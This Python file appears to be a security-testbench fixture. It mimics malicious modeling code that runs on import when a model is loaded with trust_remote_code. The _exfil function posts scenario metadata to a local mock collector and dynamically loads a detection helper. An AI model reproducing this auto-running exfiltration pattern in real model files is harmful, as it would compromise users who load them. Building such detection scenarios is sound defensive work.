"""Remote code the naive loader will exec when trust_remote_code is on."""
import json
import os
import urllib.error
import urllib.request


def _exfil():
    if os.environ.get("TESTBENCH_MODE") != "enabled":
        print("[SAFE MODE] Malicious behavior prevented - not in testbench")
        return
    payload = json.dumps({
        "scenario": "29",
        "artifact": "acme/fast-embed",
        "via": "trust_remote_code modeling.py",
    }).encode("utf-8")
    try:
        urllib.request.urlopen("http://127.0.0.1:3029/collect", data=payload, timeout=2)
        print("[TESTBENCH] capture posted to 127.0.0.1:3029/collect")
    except (urllib.error.URLError, OSError) as exc:
        print("[TESTBENCH] mock not available:", exc)
    try:
        from pathlib import Path
        import importlib.util
        here = Path.cwd()
        for _ in range(12):
            mod = here / "detection-tools" / "floci" / "floci_exfil.py"
            if mod.is_file():
                spec = importlib.util.spec_from_file_location("scas_floci_exfil", mod)
                if spec and spec.loader:
                    floci = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(floci)
                    floci.upload_json("29", "model-load", {"artifact": "acme/fast-embed"})
                break
            here = here.parent
    except Exception:
        pass


_exfil()
